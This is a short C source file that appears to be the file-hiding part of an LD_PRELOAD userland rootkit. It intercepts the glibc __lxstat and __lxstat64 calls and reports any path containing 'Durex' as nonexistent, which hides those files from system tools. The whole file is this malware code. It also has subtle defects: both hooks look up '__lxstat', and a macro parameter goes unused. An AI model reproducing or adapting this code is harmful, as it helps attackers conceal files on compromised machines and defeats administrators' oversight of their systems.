#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <errno.h>
#include <string.h>
static const char*filter="Durex";
#define DECLARE_LXSTAT(lxstat,stat)static int(*original_##lxstat)(int,const char*,struct stat*)=0;int lxstat(int v,const char*p,struct stat*b){if(original_##lxstat==NULL){original_##lxstat=dlsym(RTLD_NEXT,"__lxstat");if(original_##lxstat==NULL){return -1;}}if(strstr(p,filter)){errno=ENOENT;return -1;}return original_##lxstat(v,p,b);}
DECLARE_LXSTAT(__lxstat64, stat64);
DECLARE_LXSTAT(__lxstat, stat);
